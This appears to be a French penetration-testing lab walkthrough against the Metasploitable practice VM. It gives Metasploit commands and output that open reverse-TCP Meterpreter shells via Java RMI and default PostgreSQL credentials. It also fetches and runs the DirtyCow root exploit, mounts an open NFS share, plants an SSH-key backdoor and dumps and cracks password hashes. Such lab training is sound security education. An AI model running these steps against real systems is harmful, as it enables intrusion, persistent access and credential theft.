  HTTPDELAY  10               yes       Time that the HTTP Server will wait for the payload request
  RHOSTS     192.168.56.115   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
  RPORT      35476            yes       The target port (TCP)
  SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
  SRVPORT    8080             yes       The local port to listen on.
  SSL        false            no        Negotiate SSL for incoming connections
  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
  URIPATH                     no        The URI to use for this exploit (default is random)

[...]
```

#### Configurer les options :

```bash
msf6 exploit(multi/misc/java_rmi_server) > set RHOST 192.168.56.115
RHOST => 192.168.56.115

msf6 exploit(multi/misc/java_rmi_server) > set RPORT 1099
RPORT => 1099
```

#### Exécuter l'exploit

```bash
msf6 exploit(multi/misc/java_rmi_server) > run

[*] Started reverse TCP handler on 192.168.56.114:4444 
[*] 192.168.56.115:1099 - Using URL: http://0.0.0.0:8080/J9MvKpXba
[*] 192.168.56.115:1099 - Local IP: http://10.0.2.15:8080/J9MvKpXba
[*] 192.168.56.115:1099 - Server started.
[*] 192.168.56.115:1099 - Sending RMI Header...
[*] 192.168.56.115:1099 - Sending RMI Call...
[*] 192.168.56.115:1099 - Replied to request for payload JAR
[*] Sending stage (58125 bytes) to 192.168.56.115
[*] Meterpreter session 3 opened (192.168.56.114:4444 -> 192.168.56.115:51105) at 2021-01-26 10:30:19 +0000
[*] 192.168.56.115:1099 - Server stopped.

meterpreter > 
meterpreter > sysinfo
Computer    : metasploitable
OS          : Linux 2.6.24-16-server (i386)
Meterpreter : java/linux
meterpreter > 
```

## PostgreSQL

Postgresql utilise les identifiants par défauts "postgres/postgres".

```bash
msf6 post(multi/recon/local_exploit_suggester) > use exploit/linux/postgres/postgres_payload
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
msf6 exploit(linux/postgres/postgres_payload) > options 

Module options (exploit/linux/postgres/postgres_payload):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  template1        yes       The database to authenticate against
   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
   RHOSTS    10.10.11.32      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:
                                        <path>'
   RPORT     5432             yes       The target port
   USERNAME  postgres         yes       The username to authenticate as
   VERBOSE   false            no        Enable verbose output


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.11.2       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux x86
```

C'est exploit nous permet d'obtenir une exécution de commande avec les droits postgres :

```bash
msf6 exploit(linux/postgres/postgres_payload) > run

[*] Started reverse TCP handler on 10.10.11.2:4444 
[*] 10.10.11.32:5432 - PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)
[*] Sending stage (984904 bytes) to 10.10.11.32
[*] Uploaded as /tmp/eksNfHOu.so, should be cleaned up automatically
[*] Sending stage (984904 bytes) to 10.10.11.32
[*] Meterpreter session 2 opened (10.10.11.2:4444 -> 10.10.11.32:52875) at 2021-05-18 16:39:42 +0200

meterpreter > getuid
Server username: postgres @ metasploitable (uid=108, gid=117, euid=108, egid=117)
```

### Élévation de privilèges avec DirtyCow

La version du noyau Linux utilisé est affecté par DirtyCow :

```
$ uname -a
Linux metasploitable 2.6.24-16-server 
```

[https://dirtycow.ninja/](https://dirtycow.ninja/)

On peut utiliser l'exploit suivant pour éléver ses privilèges :
[https://github.com/FireFart/dirtycow/blob/master/dirty.c](https://github.com/FireFart/dirtycow/blob/master/dirty.c)


Vous pouvez téléchager l'exploit sur votre kali avec la commande `wget` :

```bash
wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
```

On peut déposer le fichier avec la commande __`upload`__ :

```bash
meterpreter > cd /tmp/
meterpreter > upload dirty.c
[*] uploading  : /home/formation/exp/meta2/exploit/dirty.c -> dirty.c
[*] Uploaded -1.00 B of 4.70 KiB (-0.02%): /home/formation/exp/meta2/exploit/dirty.c -> dirty.c
[*] uploaded   : /home/formation/exp/meta2/exploit/dirty.c -> dirty.c
```

On suit après les instructions de l'exploit pour le compiler :

```bash
gcc -pthread dirty.c -o dirty -lcrypt
```

Et on peut ensuite l'exécuter pour créer un utilisateur avec les droits admin :

```bash
meterpreter > shell
Process 25390 created.
Channel 6 created.
python -c "import pty;pty.spawn('/bin/bash')"

postgres@metasploitable:/tmp$ ./dirty password
./dirty password
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: password
Complete line:
firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash

mmap: b7f51000
^C
Terminate channel 6? [y/N]  y
```

Et on créer un nouveau shell pour se connecter avec `su` :

```bash
meterpreter > shell
Process 25403 created.
Channel 7 created.

su firefart  
su: must be run from a terminal

python -c "import pty;pty.spawn('/bin/bash')"

postgres@metasploitable:/tmp$ su firefart
su firefart
Password: password

firefart@metasploitable:/tmp# id
id
uid=0(firefart) gid=0(root) groups=0(root)
```

# Erreurs de configuration

## NFS

Pour acccéder à un partage de fichier NFS, on a besoin du paquet nfs-common
```bash
sudo apt install nfs-common
```

On peut utiliser la commande `showmount` pour voir les partages disponibles.

    $ showmount -e 192.168.56.115

    Export list for 192.168.56.115:
    / *

La commande nous indique que l'on peut monter `/` soit la racine du système de fichier.

On monte le partage distant avec la commande `mount`.

```bash
$ mkdir nfs_mnt

$ mount -t nfs 192.168.56.115:/ nfs_mnt/

$ cd nfs_mnt/

$ ls
bin  boot  cdrom  dev  etc  home  initrd  initrd.img  lib  lost+found  media  mnt  nohup.out  opt  proc  root  sbin  srv  sys  tmp  usr  var  vmlinuz

```


# Tuto authent clé SSH

## Avec Metasploit

Si on possède une session active sur la machine.

```bash
Active sessions
===============

  Id  Name  Type                   Information                              Connection
  --  ----  ----                   -----------                              ----------
                                     ..
  6         meterpreter x86/linux  root @ metasploitable (uid=0, gid=0, eu  10.10.11.2:4433 -> 10.10.11.32:37544 (1
                                   id=0, egid=0) @ metasploitable.localdo.  0.10.11.32)
                                   ..

```

On peut selectionner un module de post exploitation :

```bash
> use post/linux/manage/sshkey_persistence 
msf6 post(linux/manage/sshkey_persistence) > options 

Module options (post/linux/manage/sshkey_persistence):

   Name             Current Setting       Required  Description
   ----             ---------------       --------  -----------
   CREATESSHFOLDER  false                 yes       If no .ssh folder is found, create it for a user
   PUBKEY                                 no        Public Key File to use. (Default: Create a new one)
   SESSION                                yes       The session to run this module on.
   SSHD_CONFIG      /etc/ssh/sshd_config  yes       sshd_config file
   USERNAME                               no        User to add SSH key to (Default: all users on box)
```

On donne alors un numéro de session, et on exécute le module :
```bash
msf6 post(linux/manage/sshkey_persistence) > set SESSION 6
SESSION => 6
msf6 post(linux/manage/sshkey_persistence) > options 

Module options (post/linux/manage/sshkey_persistence):

   Name             Current Setting       Required  Description
   ----             ---------------       --------  -----------
   CREATESSHFOLDER  false                 yes       If no .ssh folder is found, create it for a user
   PUBKEY                                 no        Public Key File to use. (Default: Create a new one)
   SESSION          6                     yes       The session to run this module on.
   SSHD_CONFIG      /etc/ssh/sshd_config  yes       sshd_config file
   USERNAME                               no        User to add SSH key to (Default: all users on box)

```

On exécute alors le module avec la commande `run`
```bash
msf6 post(linux/manage/sshkey_persistence) > run

[*] Checking SSH Permissions
[*] Authorized Keys File: .ssh/authorized_keys
[*] Finding .ssh directories
[+] Storing new private key as /home/formation/.msf4/loot/20210519091636_default_10.10.11.32_id_rsa_436775.txt
[*] Adding key to /home/msfadmin/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /home/user/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /root/.ssh/authorized_keys
[+] Key Added
[*] Post module execution completed

```

Une __clé publique SSH__ a été ajouté dans le fichier authorized_keys des différents utilisateurs.\
Une __clé privée SSH__ a été générée ici :  `/home/formation/.msf4/loot/20210519091636_default_10.10.11.32_id_rsa_436775.txt`.

On peut utiliser notre clé privée SSH pour se connecter au serveur :

Dans un Shell
```bash
$ cd /home/formation/.msf4/loot/
                                                                                                                     
$ chmod 600 20210519091636_default_10.10.11.32_id_rsa_436775.txt 
                                                                                                                     
$ ssh -i 20210519091636_default_10.10.11.32_id_rsa_436775.txt root@10.10.11.32

root@metasploitable:~#  
```

## A la main

Générer des clés ssh :
```bash
$ssh-keygen 

Generating public/private rsa key pair.
Enter file in which to save the key (/home/user/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/user/.ssh/id_rsa
Your public key has been saved in /home/user/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:O+OS/C5qQNVIF/T8CsoImHAkhjYIrHujcvmhucboCIU user@parrot-virtual
The key's randomart image is:
+---[RSA 3072]----+
|B....++.         |
|+*  o..o         |
|+ o.    o        |
|++.      .       |
|Eo.   . S .      |
|.o+o . . o       |
|.=.++. .=        |
|* =o..=. o       |
|++++o. =+        |
+----[SHA256]-----+
```

Un couple `id_rsa` et `id_rsa.pub` viennent d'apparaitre dans le dossier `.ssh`.

On utilise la commande `ssh-copy-id` pour enregister notre clé publique sur le serveur distant.

```bash
$ssh-copy-id -i ~/.ssh/id_rsa.pub -p 22808 kali@137.74.90.91

/usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed: "/home/user/.ssh/id_rsa.pub"
/usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed
/usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you are prompted now it is to install the new keys
kali@137.74.90.91's password: 

Number of key(s) added: 1

Now try logging into the machine, with:   "ssh -p '22808' 'kali@137.74.90.91'"
and check to make sure that only the key(s) you wanted were added.
```

On peut désormais s'authentifier sans mot de passe sur la machine distante.

    ssh -p '22808' 'kali@137.74.90.91'

Vous pouvez voir que dans le fichier `.ssh/authorized_keys` de la machine distante, votre clé publique `id_rsa.pub` a été ajoutée.

## Ajout d'une backdoor sur Metasploitable

On génère en clé SSH avec `ssh-keygen`.

```bash
$ssh-keygen -f key                                        

Generating public/private rsa key pair.                        
Enter passphrase (empty for no passphrase):                    
Enter same passphrase again:                                   
Your identification has been saved in key                      
Your public key has been saved in key.pub                      
The key fingerprint is:                                        
SHA256:mscoGtdcQDZEd83EPdE8VA2CrkjMPztKJuteo2kH16c user@parrot-
virtual                                                        
The key's randomart image is:                                  
+---[RSA 3072]----+                                            
|     o* . .*o.+*+|                                            
|     o o .. +.o.+|                                            
|     o.  .     ..|                                            
|      +.  .      |                                            
|     . +S.       |                                            
|    .oo*= .      |                                            
|  . +o@ o=       |                                            
|   +.X.oE        |                                            
|  .+*... .       |                                            
+----[SHA256]-----+                                            
```

On a notre clé publique `key.pub`.

```bash
$ cat key.pub

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDgywhSCe4R2A9REn9oMGpmLa6
esXrAXNNyhkFcMYtYPHgq0Zswmdyrs3NQclWNVpkc+ZfEenvxY1xJ0xDef2b2XI
xundfNeNiYKuHcwsmY5rlSE1IlmnegCoB12JaUIYNZXCwNiVEby53sz/vYelHSB
vY7wdt9/cJJR7tEosWRR3YkkVEc469wlSnGJ98iu8IdnQz++6EG1612ZE9su07v
8HCD+OAZpa05fbB6R5PrCAQcMEWCRvIV2qZRo+hR2D/Pp0QMo7MNbuf4nMNfUty
u4viXJtwa3MCS53axirWPmw8oZqAqW3rFXNLQrIuoXwMl3oyWeC+A63VWdiNXom
gvYdstdNA43yVxBK2EnbOLTydu0R0OW9DeKpG7B/fj5WTFgU8iQT/JX7Bw/RfcR
gg2oOEuJ8R+cItNop6zIFdFX0g0GogEUc1HgjhcW3+CoutoEkRUgBaX88VblyRK
ng90pkYtVLPJfWrznvRWnsafQHsiZDxL7Qy//vdRY3z4c6s= user@parrot-vi
rtual                                                          
```

On peut ajouter notre clé publique au fichier `authorized_keys` de la machine distante.

```zsh
┌─[root@parrot-virtual]─[/home/user/meta2/share/root/.ssh]
└──╼ #echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDgywhSCe4R2A9
REn9oMGpmLa6esXrAXNNyhkFcMYtYPHgq0Zswmdyrs3NQclWNVpkc+ZfEenvxY1
xJ0xDef2b2XIxundfNeNiYKuHcwsmY5rlSE1IlmnegCoB12JaUIYNZXCwNiVEby
53sz/vYelHSBvY7wdt9/cJJR7tEosWRR3YkkVEc469wlSnGJ98iu8IdnQz++6EG
1612ZE9su07v8HCD+OAZpa05fbB6R5PrCAQcMEWCRvIV2qZRo+hR2D/Pp0QMo7M
Nbuf4nMNfUtyu4viXJtwa3MCS53axirWPmw8oZqAqW3rFXNLQrIuoXwMl3oyWeC
+A63VWdiNXomgvYdstdNA43yVxBK2EnbOLTydu0R0OW9DeKpG7B/fj5WTFgU8iQ
T/JX7Bw/RfcRgg2oOEuJ8R+cItNop6zIFdFX0g0GogEUc1HgjhcW3+CoutoEkRU
gBaX88VblyRKng90pkYtVLPJfWrznvRWnsafQHsiZDxL7Qy//vdRY3z4c6s= us
er@parrot-virtual' >> authorized_keys 
```

Et on peut ensuite se connecter en tant que root sans mot de passe sur la machine distante.

```bash
ssh -i key root@192.168.56.115
```

# Récupérer des hashs

## Avec Metasploit

Si vous avez une session avec l'utilisateur `root`, vous pouvez utiliser Metasploit pour récupérer les hashs des mots de passe utilisateurs.

```bash
msf6 > use post/linux/gather/hashdump

msf6 post(linux/gather/hashdump) > set SESSION 6
SESSION => 6

msf6 post(linux/gather/hashdump) > run

[+] root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:0:0:root:/root:/bin/bash
[+] sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:3:3:sys:/dev:/bin/sh
[+] klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:103:104::/home/klog:/bin/false
[+] msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
[+] postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
[+] user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:1001:1001:just a user,111,,:/home/user:/bin/bash
[+] service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:1002:1002:,,,:/home/service:/bin/bash
[+] Unshadowed Password File: /home/formation/.msf4/loot/20210519095541_default_10.10.11.32_linux.hashes_513726.txt
[*] Post module execution completed
```

Ces hashs sont stockés dans le dossier `~/.msf4/loot`.

### Casser les hashs

On commencer par décompresser l'archive contenant la liste de mots de passe `rockyou` :

```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

On peut ensuite utiliser `john the ripper` pour casser les mots de passe extraits du système d'exploitation.

On utilise `john` sur le fichier `hashes` du dossier `loot`.

```bash
john --rules=best64 --wordlist=/usr/share/wordlists/rockyou.txt ~/.msf4/loot/20210519095541_default_10.10.11.32_linux.hashes_513726.txt
```

